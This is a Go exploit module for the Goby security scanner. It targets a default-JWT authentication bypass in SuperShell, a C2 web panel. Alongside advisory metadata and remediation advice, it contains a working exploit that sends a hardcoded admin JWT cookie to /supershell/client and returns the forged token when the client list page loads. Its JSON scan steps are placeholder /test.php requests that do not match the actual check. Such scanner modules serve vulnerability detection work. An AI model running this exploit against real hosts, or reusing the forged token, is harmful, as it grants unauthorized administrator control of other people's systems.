package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SuperShell Default JWT Vulnerability",
    "Description": "<p>Supershell is a C2 remote control platform accessed through WEB services.</p><p>There is a default JWT token vulnerability in SuperShell, and you can log in to obtain system privileges.</p>",
    "Product": "SuperShell",
    "Homepage": "https://github.com/tdragon6/Supershell",
    "DisclosureDate": "2023-08-08",
    "PostTime": "2023-08-09",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "title=\"Supershell\" || header=\"supershell\" || banner=\"supershell\"",
    "GobyQuery": "title=\"Supershell\" || header=\"supershell\" || banner=\"supershell\"",
    "Level": "3",
    "Impact": "<p>Attackers can use the default JWT token to log in to the background, seize administrator privileges, and control the entire website.</p>",
    "Recommendation": "<p>1. Modify the default JWT token. The salt should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://github.com/tdragon6/Supershell"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "SuperShell JWT 硬编码凭证漏洞",
            "Product": "SuperShell",
            "Description": "<p>Supershell 是一个通过 WEB 服务访问的 C2 远程控制平台。</p><p>SuperShell 存在默认 JWT 令牌漏洞，可登录获取系统权限。</p>",
            "Recommendation": "<p>1、修改默认 JWT token，salt 最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可利用默认 JWT token 登录后台，夺取管理员权限，控制整个网站。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "SuperShell Default JWT Vulnerability",
            "Product": "SuperShell",
            "Description": "<p>Supershell is a C2 remote control platform accessed through WEB services.<br></p><p>There is a default JWT token vulnerability in SuperShell, and you can log in to obtain system privileges.<br></p>",
            "Recommendation": "<p>1. Modify the default JWT token. The salt should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can use the default JWT token to log in to the background, seize administrator privileges, and control the entire website.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10813"
}`

	sendPayload480da11f := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/supershell/client")
		cfg.Header.Store("Cookie", "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjkyNDkyOTYwfQ.c70Gyw-E3gE0sA41piRW1Z07Olth7bmGvDb9Zishqd4")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayload480da11f(u)
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Title, "客户端列表")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			rsp, err := sendPayload480da11f(expResult.HostInfo)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if rsp.StatusCode == 200 && strings.Contains(rsp.Title, "客户端列表") {
				expResult.Success = true
				expResult.Output = "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjkyNDkyOTYwfQ.c70Gyw-E3gE0sA41piRW1Z07Olth7bmGvDb9Zishqd4"
				return expResult
			}
			expResult.Success = false
			expResult.Output = "漏洞利用失败"
			return expResult
		},
	))
}
